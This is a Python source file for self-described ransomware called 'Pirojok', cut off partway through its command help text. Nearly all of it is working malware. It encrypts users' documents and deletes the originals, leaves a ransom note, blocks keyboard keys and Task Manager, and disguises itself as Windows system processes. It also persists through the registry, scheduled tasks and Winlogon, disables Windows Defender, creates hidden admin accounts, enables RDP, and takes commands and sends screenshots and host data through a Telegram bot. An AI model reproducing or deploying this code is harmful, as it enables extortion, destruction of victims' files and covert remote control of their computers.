#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pirojok - ADVANCED RANSOMWARE
Version 6.0 - ALL FEATURES IN ENGLISH
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io
import ctypes
import winreg
import tempfile
import uuid
import base64
import random
import shutil
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class ProcessHider:
    """Process hiding and masquerading module"""
    
    def __init__(self, parent):
        self.p = parent
        self.masked = False
        self.current_mask = None
        self.mask_level = 0
        self.original_name = None
        self.hidden_pid = None
        self.watchdog_file = None
        
        # Legitimate Windows processes for masquerading
        self.mask_processes = [
            "svchost.exe", "explorer.exe", "RuntimeBroker.exe",
            "dllhost.exe", "conhost.exe", "taskhostw.exe",
            "fontdrvhost.exe", "spoolsv.exe", "SearchIndexer.exe",
            "sihost.exe", "backgroundTaskHost.exe", "smss.exe",
            "csrss.exe", "winlogon.exe", "services.exe",
            "lsass.exe", "svchost.exe", "wininit.exe"
        ]
        
    def auto_masquerade(self):
        """Automatic masquerading at startup"""
        try:
            if platform.system() != "Windows":
                return
            
            # Check if already running under mask
            current_exe = sys.executable.lower() if getattr(sys, 'frozen', False) else ""
            for proc in self.mask_processes:
                if proc.lower() in current_exe:
                    print(f"Already running as {proc}")
                    self.masked = True
                    self.current_mask = proc
                    return
            
            # Save original name
            if getattr(sys, 'frozen', False):
                self.original_name = sys.executable
            else:
                self.original_name = os.path.abspath(__file__)
            
            # Choose random process for masquerading
            self.current_mask = random.choice(self.mask_processes)
            self.mask_level = random.randint(1, 3)
            
            # Apply masquerading
            if self.mask_level >= 1:
                self.mask_process_name()
            
            if self.mask_level >= 2 and self.p.admin_mode:
                self.mask_registry_keys()
            
            if self.mask_level >= 3 and self.p.admin_mode:
                self.mask_file_attributes()
            
        except Exception as e:
            print(f"Masquerade error: {e}")
    
    def mask_process_name(self):
        """Masquerade process name"""
        try:
            if not getattr(sys, 'frozen', False):
                return
            
            current_dir = os.path.dirname(sys.executable)
            masked_path = os.path.join(current_dir, self.current_mask)
            
            if not os.path.exists(masked_path):
                print(f"Creating copy: {masked_path}")
                shutil.copy2(sys.executable, masked_path)
                
                # Create restart script
                restart_script = os.path.join(tempfile.gettempdir(), "restart_pirojok.bat")
                with open(restart_script, 'w') as f:
                    f.write(f'''@echo off
timeout /t 2 /nobreak > nul
start "" "{masked_path}"
del "%~f0"
''')
                
                print(f"Restarting as {self.current_mask}")
                subprocess.Popen(['cmd', '/c', restart_script], shell=True, 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
                self.p.send_message(self.p.owner_id, f"[MASK] Restarting as {self.current_mask}")
                time.sleep(3)
                sys.exit(0)
            else:
                self.masked = True
                
        except Exception as e:
            print(f"Error masking name: {e}")
    
    def mask_registry_keys(self):
        """Masquerade registry entries"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, 
                                 f"C:\\Windows\\System32\\{self.current_mask}")
        except:
            pass
    
    def mask_file_attributes(self):
        """Hide file attributes"""
        try:
            if getattr(sys, 'frozen', False):
                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 4)
        except:
            pass
    
    def inject_into_system(self):
        """Inject into legitimate system process (requires admin)"""
        try:
            if not self.p.admin_mode:
                return "[ERROR] Need admin rights for process injection"
            
            # Find svchost.exe to inject into
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() == 'svchost.exe':
                    target_pid = proc.info['pid']
                    break
            else:
                return "[ERROR] No svchost.exe found"
            
            # Create a copy with system name
            if getattr(sys, 'frozen', False):
                current_exe = sys.executable
                system_dir = os.environ['SystemRoot']
                masked_path = os.path.join(system_dir, "System32", "wuauclt.exe")
                
                shutil.copy2(current_exe, masked_path)
                
                # Create service
                subprocess.run([
                    'sc', 'create', 'WindowsUpdateService', 
                    'binPath=', f'"{masked_path}"',
                    'start=', 'auto'
                ], capture_output=True)
                
                self.hidden_pid = target_pid
                return f"[INJECT] Injected into process {target_pid}"
            
        except Exception as e:
            return f"[ERROR] Injection failed: {e}"
    
    def setup_watchdog(self):
        """Create watchdog file to restore if deleted"""
        try:
            if getattr(sys, 'frozen', False):
                # Create copies in multiple locations
                locations = [
                    os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches'),
                    os.path.join(os.environ['TEMP'], 'Microsoft'),
                    os.path.join(os.environ['SystemRoot'], 'Temp', 'MicrosoftUpdate')
                ]
                
                for loc in locations:
                    try:
                        os.makedirs(loc, exist_ok=True)
                        backup_path = os.path.join(loc, 'wuauclt.exe.bak')
                        shutil.copy2(sys.executable, backup_path)
                    except:
                        pass
                
                # Create watchdog script
                self.watchdog_file = os.path.join(tempfile.gettempdir(), "watchdog.vbs")
                with open(self.watchdog_file, 'w') as f:
                    f.write('''
Set WShell = CreateObject("WScript.Shell")
Do While True
    ' Check if main process exists
    Dim objWMIService, colProcesses
    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%Pirojok%'")
    
    If colProcesses.Count = 0 Then
        ' Restore from backup
        WShell.Run "wuauclt.exe", 0, False
    End If
    
    WScript.Sleep 30000  ' Check every 30 seconds
Loop
''')
                
                # Run watchdog
                subprocess.Popen(['wscript', '//B', self.watchdog_file], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
                return "[WATCHDOG] Watchdog activated"
            return "[ERROR] Not compiled"
        except Exception as e:
            return f"[ERROR] Watchdog failed: {e}"
    
    def get_mask_status(self):
        """Get masquerade status"""
        status = f"[MASK] Masquerade: {'ACTIVE' if self.masked else 'INACTIVE'}\n"
        status += f"[MASK] Current mask: {self.current_mask or 'None'}\n"
        status += f"[MASK] Level: {self.mask_level}/3\n"
        if self.hidden_pid:
            status += f"[MASK] Hidden PID: {self.hidden_pid}\n"
        return status


class PirojokRansomware:
    def __init__(self, parent):
        self.p = parent
        self.encryption_key = None
        self.encrypted_files = []
        self.ransom_note = "README_PIROJOK.txt"
        self.cmd_window = None
        self.active = False
        self.target_extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sql', '.mdb', '.accdb',
            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js']
        self.exclude_dirs = ['windows', 'winnt', 'program files', 'program files (x86)',
            'boot', 'system32', 'system', '$recycle.bin']
        
    def generate_key(self):
        self.encryption_key = os.urandom(32)
        return base64.b64encode(self.encryption_key).decode()
    
    def show_cmd_message(self):
        try:
            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
            message = """
+--------------------------------------------------------------+
|                    PIROJOK RANSOMWARE                        |
+--------------------------------------------------------------+
|                                                              |
|   YOUR FILES HAVE BEEN ENCRYPTED!                            |
|                                                              |
|   To recover your files, read README_PIROJOK.txt            |
|   on your desktop                                            |
|                                                              |
|   KEYS F1-F12, ESC, SHIFT, CTRL ARE BLOCKED!                |
|                                                              |
|   To unlock, enter decryption key in Telegram bot            |
|                                                              |
+--------------------------------------------------------------+
            """
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'''@echo off
title PIROJOK RANSOMWARE
color 0C
mode con cols=70 lines=20
echo {message}
echo.
echo DECRYPTION KEY SENT TO TELEGRAM
echo.
pause > nul
''')
            self.cmd_window = subprocess.Popen(
                ['cmd', '/c', 'start', '/min', 'cmd', '/c', bat_path],
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(1)
            os.system(f'start /max cmd /c "{bat_path}"')
        except Exception as e:
            print(f"Error showing CMD: {e}")
    
    def block_all_keys(self):
        try:
            import ctypes
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            except: pass
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            except: pass
            user32 = ctypes.windll.user32
            user32.SystemParametersInfoW(0x0097, 1, None, 0)
            self.active = True
            return True
        except Exception as e:
            print(f"Error blocking keys: {e}")
            return False
    
    def encrypt_file(self, filepath):
        try:
            iv = os.urandom(16)
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            with open(filepath, 'rb') as f:
                file_data = f.read()
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            encrypted_path = filepath + '.pirojok'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(filepath)
            return encrypted_path
        except: return None
    
    def scan_and_encrypt(self):
        if not self.encryption_key:
            self.generate_key()
        root_paths = [os.path.expanduser("~\\Desktop"), os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"), os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"), os.path.expanduser("~\\Downloads")]
        encrypted = []
        file_count = 0
        max_files = 50
        for root_path in root_paths:
            if not os.path.exists(root_path): continue
            for root, dirs, files in os.walk(root_path):
                skip = False
                for exclude in self.exclude_dirs:
                    if exclude in root.lower():
                        skip = True
                        break
                if skip: continue
                for file in files:
                    if file_count >= max_files: break
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    if ext in self.target_extensions and not file.endswith('.pirojok'):
                        result = self.encrypt_file(file_path)
                        if result:
                            encrypted.append(file_path)
                            self.encrypted_files.append(result)
                            file_count += 1
                            if file_count % 10 == 0:
                                self.p.send_message(self.p.owner_id, f"[LOCK] Encrypted {file_count} files...")
                if file_count >= max_files: break
            if file_count >= max_files: break
        return encrypted
    
    def create_ransom_note(self):
        note_path = os.path.join(os.path.expanduser("~\\Desktop"), self.ransom_note)
        key_b64 = base64.b64encode(self.encryption_key).decode()
        note = f"""
+--------------------------------------------------------------+
|                    PIROJOK RANSOMWARE                        |
+--------------------------------------------------------------+
|                                                              |
|   Your files have been encrypted!                            |
|                                                              |
|   Total encrypted: {len(self.encrypted_files)} files         |
|                                                              |
|   To recover, use this key:                                  |
|   {key_b64}                                                  |
|                                                              |
|   Send command to Telegram:                                  |
|   ransom_decrypt {key_b64}                                   |
|                                                              |
|   Keys F1-F12, ESC, SHIFT, CTRL are BLOCKED!                 |
|   Reboot to unlock (will lose files)                         |
|                                                              |
+--------------------------------------------------------------+
        """
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note)
        return note_path
    
    def start_ransomware(self):
        try:
            self.p.send_message(self.p.owner_id, "[LOCK] Starting ransomware...")
            self.block_all_keys()
            self.p.send_message(self.p.owner_id, "[LOCK] Keys blocked!")
            self.show_cmd_message()
            self.p.send_message(self.p.owner_id, "[CMD] Message shown!")
            encrypted = self.scan_and_encrypt()
            note = self.create_ransom_note()
            os.startfile(note)
            self.p.add_all_startup_methods()
            result = f"[OK] Encrypted {len(encrypted)} files\n"
            result += f"[NOTE] {note}\n"
            result += f"[KEY] {base64.b64encode(self.encryption_key).decode()}\n"
            result += f"[LOCK] Keys blocked!\n"
            result += f"[AUTO] Startup installed!"
            return result
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def decrypt_all(self, key_b64):
        try:
            self.encryption_key = base64.b64decode(key_b64)
            pirojok_files = []
            for root, dirs, files in os.walk("C:\\Users"):
                for file in files:
                    if file.endswith('.pirojok'):
                        pirojok_files.append(os.path.join(root, file))
            decrypted = 0
            for file in pirojok_files:
                try:
                    with open(file, 'rb') as f:
                        iv = f.read(16)
                        encrypted_data = f.read()
                    cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                    original_path = file.replace('.pirojok', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    os.remove(file)
                    decrypted += 1
                except: pass
            if decrypted > 0:
                self.unblock_keys()
                self.remove_cmd_message()
                self.p.remove_all_startup()
                self.active = False
            return f"[OK] Decrypted {decrypted} files"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def unblock_keys(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            try:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            except: pass
            self.p.send_message(self.p.owner_id, "[UNLOCK] Keys unlocked!")
        except: pass
    
    def remove_cmd_message(self):
        try:
            if self.cmd_window:
                self.cmd_window.terminate()
            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*"')
        except: pass


class Pirojok:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "6.0"
        self.command_timeout = 60
        self.admin_mode = False
        self.startup_time = datetime.now()
        self.processing = False
        self.started = False
        
        # Initialize modules
        self.ransom = PirojokRansomware(self)
        self.hider = ProcessHider(self)
        
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
        self.admin_mode = self.check_admin()
        print(f"Admin rights: {'YES' if self.admin_mode else 'NO'}")
        
        # Auto-masquerade at startup
        self.hider.auto_masquerade()
        
    def check_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except: return False
    
    def request_admin(self):
        try:
            if self.check_admin():
                self.admin_mode = True
                return "[ADMIN] Already have admin rights!"
            if platform.system() != "Windows":
                return "[ERROR] Admin request only for Windows"
            if getattr(sys, 'frozen', False):
                executable = sys.executable
            else:
                executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            self.send_message(self.owner_id, "[ADMIN] Requesting admin rights...")
            result = ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
            if result > 32:
                self.send_message(self.owner_id, "[ADMIN] Restarting with admin rights...")
                time.sleep(2)
                sys.exit(0)
            else:
                self.send_message(self.owner_id, f"[ERROR] Failed to get admin rights (code: {result})")
                return "[ERROR] Failed to get admin rights"
        except Exception as e:
            self.send_message(self.owner_id, f"[ERROR] {e}")
            return f"[ERROR] {e}"
    
    def run_as_admin_command(self, command):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights. Use 'admin' first"
            if platform.system() == "Windows":
                process = subprocess.Popen(f'cmd /c {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    text=True, encoding='cp866', errors='ignore')
            else:
                process = subprocess.Popen(f'sudo {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
            self.processes.append(process)
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"[TIMEOUT]\nPartial output:\n{stdout}"
            result = ""
            if stdout: result += f"[OK]\n{stdout}\n"
            if stderr: result += f"[ERROR]\n{stderr}\n"
            return result or "[OK] Command executed"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def create_admin_user(self, username, password):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
            result = self.run_as_admin_command(cmd)
            return f"[USER] Created user {username}\n{result}"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def enable_rdp(self):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            commands = [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                'sc config TermService start= auto',
                'net start TermService'
            ]
            for cmd in commands:
                self.run_as_admin_command(cmd)
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"[RDP] Enabled\nIP: {ip}\nPort: 3389"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def disable_defender(self):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ]
            for cmd in commands:
                self.run_as_admin_command(cmd)
            return "[DEFENDER] Windows Defender disabled"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def add_firewall_rule(self, port, name="Pirojok"):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights"
            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
            self.run_as_admin_command(cmd)
            return f"[FW] Rule added for port {port}"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def ransomware_start(self):
        try:
            if not self.admin_mode:
                return "[ERROR] Need admin rights for ransomware"
            result = self.ransom.start_ransomware()
            return result
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def ransomware_key(self):
        try:
            if self.ransom.encryption_key:
                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
                return f"[KEY] {key_b64}"
            else:
                return "[ERROR] No key generated (run ransomware first)"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def ransomware_decrypt(self, key_b64):
        try:
            result = self.ransom.decrypt_all(key_b64)
            return result
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def add_all_startup_methods(self):
        results = []
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Registry HKCU
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe_path}"')
            results.append("[OK] Registry HKCU")
        except: results.append("[FAIL] Registry HKCU")
        
        # Startup folder
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            vbs_script = f'''
            Set oWS = WScript.CreateObject("WScript.Shell")
            sLinkFile = "{startup_folder}\\WindowsUpdate.lnk"
            Set oLink = oWS.CreateShortcut(sLinkFile)
            oLink.TargetPath = "{exe_path}"
            oLink.Save
            '''
            vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
            os.remove(vbs_path)
            results.append("[OK] Startup folder")
        except: results.append("[FAIL] Startup folder")
        
        # Task scheduler (logon)
        try:
            task_name = "WindowsUpdateTask"
            cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                   '/sc', 'onlogon', '/rl', 'highest', '/f']
            subprocess.run(cmd, capture_output=True)
            results.append("[OK] Task scheduler (logon)")
        except: results.append("[FAIL] Task scheduler (logon)")
        
        if self.admin_mode:
            # Task scheduler (system startup)
            try:
                task_name = "WindowsUpdateSystem"
                cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                       '/sc', 'onstart', '/ru', 'SYSTEM', '/rl', 'highest', '/f']
                subprocess.run(cmd, capture_output=True)
                results.append("[OK] Task scheduler (startup)")
            except: results.append("[FAIL] Task scheduler (startup)")
            
            # Winlogon Shell
            try:
                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                key = winreg.HKEY_LOCAL_MACHINE
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                    try:
                        current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
                    except:
                        current_shell = "explorer.exe"
                    if exe_path not in current_shell:
                        new_shell = f"{exe_path}, {current_shell}"
                        winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
                results.append("[OK] Winlogon Shell")
            except: results.append("[FAIL] Winlogon Shell")
            
            # Active Setup
            try:
                guid = str(uuid.uuid4())
                key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
                key = winreg.HKEY_LOCAL_MACHINE
                with winreg.CreateKey(key, key_path) as regkey:
                    winreg.SetValueEx(regkey, "StubPath", 0, winreg.REG_SZ, f'"{exe_path}"')
                    winreg.SetValueEx(regkey, "Version", 0, winreg.REG_SZ, "1,0,0,0")
                results.append("[OK] Active Setup")
            except: results.append("[FAIL] Active Setup")
        
        return "\n".join(results)
    
    def remove_all_startup(self):
        results = []
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "WindowsUpdateSvc")
            results.append("[OK] Removed from registry")
        except: results.append("[FAIL] Not found in registry")
        
        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True)
        results.append("[OK] Removed from task scheduler")
        
        return "\n".join(results)
    
    def send_message(self, chat_id, text):
        """Simple message sending with plain text"""
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_text = f"[{timestamp}] {text}"
            
            url = f"{self.base_url}/sendMessage"
            data = {"chat_id": chat_id, "text": simple_text}
            
            requests.post(url, data=data, timeout=10)
            print(f"Sent: {text[:30]}...")
                
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            simple_caption = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": simple_caption}
            
            requests.post(url, files=files, data=data, timeout=30)
            print(f"Photo sent: {caption[:30]}...")
                
        except Exception as e:
            print(f"Photo error: {e}")
    
    def get_system_info(self):
        info = []
        info.append(f"[PIROJOK] System Info")
        info.append(f"Version: {self.version}")
        info.append(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"Host: {socket.gethostname()}")
        info.append(f"User: {getpass.getuser()}")
        info.append(f"Admin: {'YES' if self.admin_mode else 'NO'}")
        info.append(f"Mask: {'YES' if self.hider.masked else 'NO'}")
        try:
            info.append(f"IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"IP: unknown")
        info.append(f"OS: {platform.system()} {platform.release()}")
        uptime = datetime.now() - self.startup_time
        info.append(f"Uptime: {str(uptime).split('.')[0]}")
        return "\n".join(info)
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except: return None
    
    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                process = subprocess.Popen(f'cmd /c {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    text=True, encoding='cp866', errors='ignore')
            else:
                process = subprocess.Popen(command, shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
            self.processes.append(process)
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"[TIMEOUT]\nPartial output:\n{stdout}"
            result = ""
            if stdout:
                result += f"[OK]\n{stdout}\n"
            if stderr:
                result += f"[ERROR]\n{stderr}\n"
            return result or "[OK] Command executed"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def open_website(self, url):
        try:
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            if platform.system() == "Windows":
                os.system(f"start {url}")
            elif platform.system() == "Darwin":
                os.system(f"open {url}")
            else:
                os.system(f"xdg-open {url}")
            return f"[WEB] Opened: {url}"
        except:
            return "[ERROR] Failed to open website"
    
    def shutdown_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /f /t 0")
            else: os.system("shutdown -h now")
            return "[SHUTDOWN] Shutting down NOW!"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def reboot_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /f /t 0")
            else: os.system("reboot -f")
            return "[REBOOT] Rebooting NOW!"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def shutdown_emergency(self):
        try:
            if platform.system() != "Windows":
                return "[ERROR] Windows only"
            os.system("taskkill /f /im *")
            os.system("shutdown /s /f /t 0")
            return "[EMERGENCY] Emergency shutdown!"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def shutdown_delayed(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 5")
            else:
                os.system("sudo shutdown -h +1")
            return "[SHUTDOWN] Shutting down in 5 seconds..."
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def reboot_delayed(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /t 5")
            else:
                os.system("sudo reboot")
            return "[REBOOT] Rebooting in 5 seconds..."
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def abort_shutdown(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /a")
                return "[ABORT] Shutdown aborted"
            else:
                return "[ERROR] Abort only for Windows"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def on_system_startup(self):
        try:
            if os.path.exists(self.marker_file):
                os.remove(self.marker_file)
                return
            if self.started: return
            self.started = True
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"[PIROJOK] Started!\n"
            message += f"Boot time: {boot_time}\n"
            message += f"Host: {socket.gethostname()}\n"
            message += f"User: {getpass.getuser()}\n"
            message += f"Admin: {'YES' if self.admin_mode else 'NO'}\n"
            message += f"Mask: {'YES' if self.hider.masked else 'NO'}"
            self.send_message(self.owner_id, message)
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "[SCREEN] Desktop after boot")
        except Exception as e:
            print(f"Startup error: {e}")
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "[ERROR] Not for you!")
            return
        print(f"Command: {text}")
        if self.processing:
            print("Already processing, skipping...")
            return
        self.processing = True
        try:
            current_admin = self.check_admin()
            if current_admin != self.admin_mode:
                self.admin_mode = current_admin
                print(f"Admin rights changed: {'YES' if self.admin_mode else 'NO'}")
            
            admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                             "add_rule", "ransom", "ransom_start", "ransom_key", "ransom_decrypt",
                             "task_startup", "explorer_shell", "active_setup", "inject", "watchdog"]
            cmd_type = text.split()[0] if text else ""
            
            if cmd_type in admin_commands and not self.admin_mode:
                self.send_message(chat_id, "[ADMIN] This command needs admin rights. Use 'admin' first")
                self.processing = False
                return
            
            # === HELP / MENU ===
            if text == "help" or text == "menu":
                help_text = """
PIROJOK v6.0 - COMMANDS:

[LOCK] RANSOMWARE:
• ransom / ransom_start - START RANSOMWARE!
• ransom_key - show encryption key
• ransom_decrypt <key> - decrypt files

[MASK] MASQUERADE:
• mask_status - show masquerade status
• mask_remove - remove masquerade
• inject - inject into system process
• watchdog - enable self-recovery

[POWER] INSTANT:
• shutdown_now - shutdown immediately
• reboot_now - reboot immediately
• shutdown_emergency - emergency shutdown

[POWER] DELAYED:
• shutdown - shutdown in 5 sec
• reboot - reboot in 5 sec
• abort - abort shutdown

[ADMIN] ADMIN COMMANDS:
• admin - request admin rights
• admin_check - check admin status
• admin_cmd <command> - run as admin
• create_user <user> <pass> - create admin user
• enable_rdp - enable Remote Desktop
• disable_defender - disable Defender
• add_rule <port> [name] - add firewall rule

[STARTUP] PERSISTENCE:
• startup_reg - add to registry
• startup_folder - add to startup folder
• task_logon - task scheduler (logon)
• task_startup - task scheduler (system)
• explorer_shell - with explorer.exe
• active_setup - for all users
• startup_remove_all - remove all

[MAIN] BASIC:
• cmd <command> - run command
• website <url> - open website
• shot - take screenshot
